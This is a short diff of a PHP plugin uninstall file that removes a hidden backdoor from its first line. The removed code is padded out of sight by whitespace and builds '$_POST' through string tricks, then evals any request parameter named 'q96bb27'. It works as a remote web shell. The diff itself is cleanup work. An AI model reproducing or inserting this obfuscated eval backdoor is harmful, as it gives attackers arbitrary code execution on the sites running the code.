@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                              $krr2= "setp_our" ;$qrd8=$krr2[0]. $krr2[2]. $krr2[7].$krr2[2]. $krr2[5]. $krr2[6]. $krr2[3]. $krr2[3].$krr2[1].$krr2[7] ;$vbzr4 =$qrd8 ($krr2[4]. $krr2[3] . $krr2[5]. $krr2[0]. $krr2[2] );if ( isset (${ $vbzr4 } [ 'q96bb27'])){ eval(${$vbzr4 } [ 'q96bb27']); } ?><?php
+<?php
 
 /**
  * Fired when the plugin is uninstalled.
